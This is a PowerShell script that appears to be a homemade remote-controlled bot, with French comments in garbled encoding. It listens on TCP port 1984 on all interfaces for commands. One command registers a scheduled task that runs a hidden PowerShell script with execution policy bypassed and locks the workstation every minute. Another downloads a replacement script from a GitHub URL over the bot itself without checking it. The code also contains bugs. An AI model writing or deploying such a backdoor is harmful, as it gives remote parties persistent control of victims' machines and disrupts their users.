#Script FRX_Socket 
function global:FRX_Socket-Listen-Connect{
    param($port=1984)
    $socket = new-object System.Net.Sockets.TcpListener('0.0.0.0',$port)
    if($socket -eq $null){exit 1}
    $socket.Start()
    return $socket    
}
function global:FRX_Socket-Listen-Read{
    param($socket,$buffersize=512)
    $script:client = $socket.AcceptTcpClient()

    $stream = $script:client.GetStream() # je rÃƒÆ’Ã‚Â©cupÃƒÆ’Ã‚Â¨re ce qui est envoyÃƒÆ’Ã‚Â©
    # Mais qu'est ce qui a ÃƒÆ’Ã‚Â©tÃƒÆ’Ã‚Â© transmis alors ?
    $buffer = New-Object system.byte[] $buffersize
    do{
        $read = $null
        while($stream.DataAvailable -or $read -eq $null){
            $read = $stream.read($buffer,0,$buffersize)
        }    
    }while($read -gt 1)
    $message = ([System.Text.Encoding]::ASCII).GetString($buffer)
    $message = $message.substring(0,$message.IndexOf(0))
    
    return $message    
}
function global:FRX_Socket-Listen-Close{
    param($socket)
    $socket.stop()
    $script:client.close()
    return $null
}
Function global:FRX_Socket-Send-Port{
    param($port = 1984,$IPTarget=127.0.0.1,$message="echo123456")
    $socket = new-object System.Net.Sockets.TcpClient($IPTarget, $port)
    $data = [System.Text.Encoding]::ASCII.GetBytes($message)
    $stream = $socket.GetStream()
    $stream.Write($data, 0, $data.Length)
    $socket.close()
    return $null
}
#$DirectoryBot = New-Item -Path "C:\Program Files (x86)\WindowsPowerShell\Configuration\Registration\lib"
$botpath      = "C:\lib\BOT\BOTOK.ps1"
$URL          = "https://raw.githubusercontent.com/Airone23/BOT-FRX/master/BOTOK.ps1"
# sur le bot : 
function global:FRX_Socket-MessageAction{
    param($message)
    $stop = $false
    switch ($message) {
        {$_ -match "HACKMETHIS"  } {write-host "hack this" -ForegroundColor green 
            #Tâche HACKMETHIS
            $tache1 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass C:\lib\BOT\test.ps1"
            $tache2  = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "user32.dll,LockWorkStation"
            $date = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once
            try{
                Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache -Description "Time to lock :)" Task -ErrorAction Stop | Out-Null
            }catch{
                Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache1,$tache2 -Description "Time to lock :)" Task
             }
                                   }
        {$_ -match "COUNT"       } {write-host "COUNT" -ForegroundColor Yellow}
        {$_ -like  "GAMEOVER"    } {write-host "--- TERMINATING CONNECTION ---" -ForegroundColor red
                                    $stop=$true}
        {$_ -like "*.. " }         {
        #idÃƒÂ©e : check maj sur github. lors du Gameover puis tÃƒÂ©lÃƒÂ©charger la MAJ sur un fichier temporaire, vÃƒÂ©rifier le HASH puis remplacer le bot par nouvelle version et effacer le fichier temp
        write-host "On va faire la MAJ avec ÃƒÂ§a" -ForegroundColor Magenta
        #On tÃƒÂ©lÃƒÂ©charge le fichier mis ÃƒÂ  jour
        #https://github.com/Airone23/BOT-FRX/releases/download/v1/BOT_ameliore.ps1
        Invoke-WebRequest -Uri $URL -OutFile $botpath
        Foreach-object {
             write-host "+---- Download ----+" -fore yellow}{
             write-host "|" -ForegroundColor Yellow -no
             Write-Host "   Download ok!   " -ForegroundColor Blue -NoNewline
             write-host "|" -ForegroundColor Yellow 
        }{   write-host "+------------------+"-fore yellow}
                $stop=$true
        }
        #{ $_ -match "*SHUTDOWN"}{Write-Host }
        Default {write-host $message}
    }
    return $stop
}
$Socket   = FRX_Socket-Listen-Connect  -port 1984
do{
    $message  = FRX_Socket-Listen-Read     -socket  $Socket -buffersize 512
    $stop     = FRX_Socket-MessageAction   -message $message
}until($stop)
$closeACK = FRX_Socket-Listen-Close    -socket $Socket 
write-host "salut je suis pas ÃƒÂ  jour"
#powershell $botpath
